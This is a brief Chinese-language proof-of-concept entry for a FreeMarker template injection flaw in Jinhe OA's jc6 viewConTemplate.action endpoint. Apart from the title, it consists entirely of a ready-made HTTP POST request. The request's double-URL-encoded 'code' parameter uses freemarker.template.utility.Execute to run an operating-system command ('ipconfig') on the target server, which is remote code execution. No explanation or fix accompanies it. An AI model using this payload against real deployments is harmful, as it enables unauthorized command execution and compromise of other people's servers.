## 金和OA_jc6_viewConTemplate.action存在FreeMarker模板注入漏洞


## poc
```
POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
Host: your-ip
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
 
moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1
```
